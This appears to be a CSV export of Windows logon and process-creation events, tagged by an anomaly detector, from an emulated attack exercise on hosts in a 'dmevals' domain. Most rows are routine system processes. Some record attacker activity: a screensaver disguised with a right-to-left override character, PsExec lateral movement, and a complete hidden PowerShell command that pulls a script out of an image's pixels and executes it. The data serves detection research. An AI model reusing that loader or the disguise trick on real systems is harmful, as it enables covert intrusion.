ProcessName,SubjectUserName,@timestamp,host,Hostname,EventID,SubjectLogonId,ProcessId,LogonType,TargetLogonId,WorkstationName,IpAddress,TargetUserName,PrivilegeList,CommandLine,ParentProcessName,NewProcessId,is_remote_logon,was_elevated,anomaly_score,detection_source,NewProcessPath,NewProcessName,ParentProcessNameOnly,suspicious_office_spawn,suspicious_svchost,exit_time,duration_seconds,obfuscated_command,pair_key,pair_frequency
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:11:41.263000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x23f4,2.0,0x867797,NASHUA,-,pbeesly,,,,,False,True,-1,logon_anomaly,,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:11:41.264000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x23f4,2.0,0x867825,NASHUA,-,pbeesly,,,,,False,False,-1,logon_anomaly,,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:12:47.928000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x1720,2.0,0x86b56b,NASHUA,-,pbeesly,,,,,False,True,-1,logon_anomaly,,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:12:47.930000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x1720,2.0,0x86b59a,NASHUA,-,pbeesly,,,,,False,False,-1,logon_anomaly,,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:13:51.455000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x2074,2.0,0x86e324,NASHUA,-,pbeesly,,,,,False,True,-1,logon_anomaly,,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:13:51.457000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x2074,2.0,0x86e353,NASHUA,-,pbeesly,,,,,False,False,-1,logon_anomaly,,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:15:05.608000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x658,2.0,0x89174e,NASHUA,-,pbeesly,,,,,False,True,-1,logon_anomaly,,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:15:05.610000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x658,2.0,0x89177d,NASHUA,-,pbeesly,,,,,False,False,-1,logon_anomaly,,,,,,,,,,
,SCRANTON$,2020-05-02 03:20:01.053000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s fhsvc,C:\Windows\System32\services.exe,0x1134,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:20:15.314000+00:00,14.261,False,services.exe -> svchost.exe,99.0
,SCRANTON$,2020-05-02 03:20:01.053000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x3e4,,,SCRANTON$,,C:\windows\System32\svchost.exe -k NetworkService -p -s DoSvc,C:\Windows\System32\services.exe,0x113c,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:24:23.396000+00:00,262.343,False,services.exe -> svchost.exe,99.0
,SCRANTON$,2020-05-02 03:20:01.054000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\System32\svchost.exe -k NetSvcs -p -s NcaSvc,C:\Windows\System32\services.exe,0x1158,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:20:01.438000+00:00,0.384,False,services.exe -> svchost.exe,99.0
,SCRANTON$,2020-05-02 03:20:02.097000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc,C:\Windows\System32\services.exe,0x1348,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:20:07.532000+00:00,5.4350000000000005,False,services.exe -> svchost.exe,99.0
,SCRANTON$,2020-05-02 03:20:08.003000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\System32\svchost.exe -k netsvcs -p -s BITS,C:\Windows\System32\services.exe,0x354,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:22:42.870000+00:00,154.86700000000005,False,services.exe -> svchost.exe,99.0
,SCRANTON$,2020-05-02 03:21:16.344000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x3e4,,,SCRANTON$,,C:\windows\System32\svchost.exe -k NetworkService -p,C:\Windows\System32\services.exe,0x1f94,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:21:25.656000+00:00,9.312,False,services.exe -> svchost.exe,99.0
,SCRANTON$,2020-05-02 03:21:18.639000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,C:\Windows\System32\smartscreen.exe -Embedding,C:\Windows\System32\svchost.exe,0x1ec8,,,-1,proc_anomaly,C:\Windows\System32\smartscreen.exe,smartscreen.exe,svchost.exe,False,False,2020-05-02 03:26:20.344000+00:00,301.7050000000001,False,svchost.exe -> smartscreen.exe,1.0
,SCRANTON$,2020-05-02 03:18:29.127000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k appmodel -p -s camsvc,C:\Windows\System32\services.exe,0xa6c,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:19:26.010000+00:00,56.883,False,services.exe -> svchost.exe,99.0
,SCRANTON$,2020-05-02 03:18:34.330000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k wsappx -p -s AppXSvc,C:\Windows\System32\services.exe,0x14d4,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:19:26.016000+00:00,51.68600000000001,False,services.exe -> svchost.exe,99.0
,SCRANTON$,2020-05-02 03:18:35.351000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s gpsvc,C:\Windows\System32\services.exe,0x232c,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:19:24.875000+00:00,49.523999999999994,False,services.exe -> svchost.exe,99.0
,pbeesly,2020-05-02 02:55:57.748000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0x1158,,0x0,,,-,,"""C:\ProgramData\victim\‮cod.3aka3.scr"" /S",C:\Windows\explorer.exe,0x214c,,,-1,proc_anomaly,C:\ProgramData\victim\‮cod.3aka3.scr,‮cod.3aka3.scr,explorer.exe,False,False,2020-05-02 03:01:28.677000+00:00,330.9290000000001,False,explorer.exe -> ‮cod.3aka3.scr,1.0
,SCRANTON$,2020-05-02 03:20:47.898000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s DsmSvc,C:\Windows\System32\services.exe,0xa14,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:21:33.258000+00:00,45.36,False,services.exe -> svchost.exe,99.0
,SCRANTON$,2020-05-02 03:20:51.611000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k wsappx -p -s AppXSvc,C:\Windows\System32\services.exe,0x16a8,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:28:11.110000+00:00,439.499,False,services.exe -> svchost.exe,99.0
,pbeesly,2020-05-02 03:00:15.426000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xba0,,0x0,,,-,,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0xf24,,,-1,proc_anomaly,powershell.exe,powershell.exe,powershell.exe,False,False,2020-05-02 03:20:07.156000+00:00,1191.73,False,powershell.exe -> powershell.exe,6.0
,pbeesly,2020-05-02 03:00:15.426000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xf24,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0xed4,,,-1,proc_anomaly,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:05:10.638000+00:00,295.2120000000001,False,powershell.exe -> conhost.exe,7.0
,SCRANTON$,2020-05-02 03:04:31.261000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x134c,,0x0,,,-,,"""C:\windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe8_ Global\UsGthrCtrlFltPipeMssGthrPipe8 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ",C:\Windows\System32\SearchIndexer.exe,0xd38,,,-1,proc_anomaly,C:\windows\system32\SearchProtocolHost.exe,searchprotocolhost.exe,searchindexer.exe,False,False,2020-05-02 03:10:51.862000+00:00,380.601,False,searchindexer.exe -> searchprotocolhost.exe,4.0
,SCRANTON$,2020-05-02 03:04:31.265000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x134c,,0x0,,,-,,"""C:\windows\system32\SearchFilterHost.exe"" 0 772 776 784 8192 780 ",C:\Windows\System32\SearchIndexer.exe,0x7b8,,,-1,proc_anomaly,C:\windows\system32\SearchFilterHost.exe,searchfilterhost.exe,searchindexer.exe,False,False,2020-05-02 03:08:16.251000+00:00,224.986,False,searchindexer.exe -> searchfilterhost.exe,5.0
,pbeesly,2020-05-02 03:05:26.907000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xba0,,0x0,,,-,,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0xf0c,,,-1,proc_anomaly,powershell.exe,powershell.exe,powershell.exe,False,False,2020-05-02 03:18:33.253000+00:00,786.346,False,powershell.exe -> powershell.exe,6.0
,pbeesly,2020-05-02 03:05:26.919000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xf0c,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x1ecc,,,-1,proc_anomaly,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:18:33.257000+00:00,786.3380000000002,False,powershell.exe -> conhost.exe,7.0
,NASHUA$,2020-05-02 03:05:26.992000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppX4325622ft6437f3xfywcfxgbedfvpn0x.mca",C:\Windows\System32\svchost.exe,0x2108,,,-1,proc_anomaly,C:\windows\system32\backgroundTaskHost.exe,backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:06:27.362000+00:00,60.37000000000001,False,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:05:27.006000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,C:\Windows\System32\RuntimeBroker.exe -Embedding,C:\Windows\System32\svchost.exe,0x196c,,,-1,proc_anomaly,C:\Windows\System32\RuntimeBroker.exe,runtimebroker.exe,svchost.exe,False,False,2020-05-02 03:06:57.600000+00:00,90.594,False,svchost.exe -> runtimebroker.exe,13.0
,NASHUA$,2020-05-02 03:05:28.244000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\System32\svchost.exe -k WerSvcGroup,C:\Windows\System32\services.exe,0x1c78,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:07:33.441000+00:00,125.197,False,services.exe -> svchost.exe,99.0
,SCRANTON$,2020-05-02 03:05:28.351000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppX4325622ft6437f3xfywcfxgbedfvpn0x.mca",C:\Windows\System32\svchost.exe,0x2300,,,-1,proc_anomaly,C:\windows\system32\backgroundTaskHost.exe,backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:06:30.388000+00:00,62.037000000000006,False,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:05:29.459000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s wlidsvc,C:\Windows\System32\services.exe,0x2220,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:08:38.600000+00:00,189.141,False,services.exe -> svchost.exe,99.0
,SCRANTON$,2020-05-02 03:05:29.642000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,C:\Windows\System32\RuntimeBroker.exe -Embedding,C:\Windows\System32\svchost.exe,0x528,,,-1,proc_anomaly,C:\Windows\System32\RuntimeBroker.exe,runtimebroker.exe,svchost.exe,False,False,2020-05-02 03:06:59.642000+00:00,90.0,False,svchost.exe -> runtimebroker.exe,13.0
,NASHUA$,2020-05-02 02:59:35.461000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1338,,,-1,proc_anomaly,C:\windows\system32\backgroundTaskHost.exe,backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:38.945000+00:00,3.4840000000000004,False,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 02:59:35.468000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,C:\Windows\System32\RuntimeBroker.exe -Embedding,C:\Windows\System32\svchost.exe,0xdd4,,,-1,proc_anomaly,C:\Windows\System32\RuntimeBroker.exe,runtimebroker.exe,svchost.exe,False,False,2020-05-02 03:00:52.312000+00:00,76.84400000000002,False,svchost.exe -> runtimebroker.exe,13.0
,SCRANTON$,2020-05-02 03:01:44.374000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s gpsvc,C:\Windows\System32\services.exe,0x204c,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:11:44.304000+00:00,599.9300000000002,False,services.exe -> svchost.exe,99.0
,SCRANTON$,2020-05-02 03:02:46.350000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x5a8,,0x0,,,-,,C:\windows\system32\ProvTool.exe /turn 5 /source LogonIdleTask,C:\Windows\System32\svchost.exe,0x16b0,,,-1,proc_anomaly,C:\windows\system32\ProvTool.exe,provtool.exe,svchost.exe,False,False,2020-05-02 03:20:37.291000+00:00,1070.941,False,svchost.exe -> provtool.exe,1.0
,SCRANTON$,2020-05-02 03:02:47.443000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s dmwappushservice,C:\Windows\System32\services.exe,0x1a64,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:06:48.516000+00:00,241.07299999999998,False,services.exe -> svchost.exe,99.0
,SCRANTON$,2020-05-02 03:02:47.451000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x3e5,,,LOCAL SERVICE,,C:\windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s SmsRouter,C:\Windows\System32\services.exe,0x1bfc,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:08:47.742000+00:00,360.291,False,services.exe -> svchost.exe,99.0
,NEWYORK$,2020-05-02 03:03:19.186000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x0,,,-,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x17e4,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:09:20.723000+00:00,361.537,False,svchost.exe -> wmiprvse.exe,17.0
,NEWYORK$,2020-05-02 03:03:33.333000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x2b8,,0x0,,,-,,C:\windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc,C:\Windows\System32\services.exe,0xcc0,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:06:36.411000+00:00,183.078,False,services.exe -> svchost.exe,99.0
,pbeesly,2020-05-02 02:57:13.974000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0x214c,,0x0,,,-,,\\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x474 --server 0x50c,C:\ProgramData\victim\‮cod.3aka3.scr,0xc50,,,-1,proc_anomaly,\\?\C:\windows\system32\conhost.exe,conhost.exe,‮cod.3aka3.scr,False,False,2020-05-02 02:59:22.531000+00:00,128.55700000000002,False,‮cod.3aka3.scr -> conhost.exe,2.0
,pbeesly,2020-05-02 02:57:13.974000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0x214c,,0x0,,,-,,"""C:\windows\system32\cmd.exe""",C:\ProgramData\victim\‮cod.3aka3.scr,0xd98,,,-1,proc_anomaly,C:\windows\system32\cmd.exe,cmd.exe,‮cod.3aka3.scr,False,False,2020-05-02 02:59:22.531000+00:00,128.55700000000002,False,‮cod.3aka3.scr -> cmd.exe,2.0
,pbeesly,2020-05-02 02:58:44.904000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0x131c,,0x0,,,-,,"""PowerShell.exe"" -noni -noexit -ep bypass -window hidden -c ""sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))""",C:\Windows\System32\control.exe,0xba0,,,-1,proc_anomaly,PowerShell.exe,powershell.exe,control.exe,False,False,2020-05-02 03:18:33.253000+00:00,1188.3490000000004,False,control.exe -> powershell.exe,1.0
,pbeesly,2020-05-02 02:58:44.912000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xba0,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x1064,,,-1,proc_anomaly,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:18:33.257000+00:00,1188.345,False,powershell.exe -> conhost.exe,7.0
,SCRANTON$,2020-05-02 02:59:16.675000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x884,,,-1,proc_anomaly,C:\windows\system32\backgroundTaskHost.exe,backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:21.315000+00:00,4.6400000000000015,False,svchost.exe -> backgroundtaskhost.exe,18.0
,SCRANTON$,2020-05-02 02:59:16.684000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,C:\Windows\System32\RuntimeBroker.exe -Embedding,C:\Windows\System32\svchost.exe,0x1a7c,,,-1,proc_anomaly,C:\Windows\System32\RuntimeBroker.exe,runtimebroker.exe,svchost.exe,False,False,2020-05-02 03:00:37.246000+00:00,80.56200000000003,False,svchost.exe -> runtimebroker.exe,13.0
,SCRANTON$,2020-05-02 02:59:23.719000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0xf10,,,-1,proc_anomaly,C:\windows\system32\backgroundTaskHost.exe,backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:27.305000+00:00,3.5860000000000003,False,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:00:10.287000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1bdc,,,-1,proc_anomaly,C:\windows\system32\backgroundTaskHost.exe,backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:18:28.084000+00:00,1097.797,False,svchost.exe -> backgroundtaskhost.exe,18.0
,pbeesly,2020-05-02 03:16:42.978000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x89177d,0x87c,,0x0,,,-,,C:\windows\system32\cmd.exe,C:\Windows\Temp\python.exe,0x2244,,,-1,proc_anomaly,C:\windows\system32\cmd.exe,cmd.exe,python.exe,False,False,2020-05-02 03:17:57.838000+00:00,74.86,False,python.exe -> cmd.exe,1.0
,SCRANTON$,2020-05-02 03:05:30.723000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\System32\svchost.exe -k WerSvcGroup,C:\Windows\System32\services.exe,0x1604,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:07:33.442000+00:00,122.719,False,services.exe -> svchost.exe,99.0
,SCRANTON$,2020-05-02 03:05:31.851000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s wlidsvc,C:\Windows\System32\services.exe,0x20cc,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:08:42.051000+00:00,190.2,False,services.exe -> svchost.exe,99.0
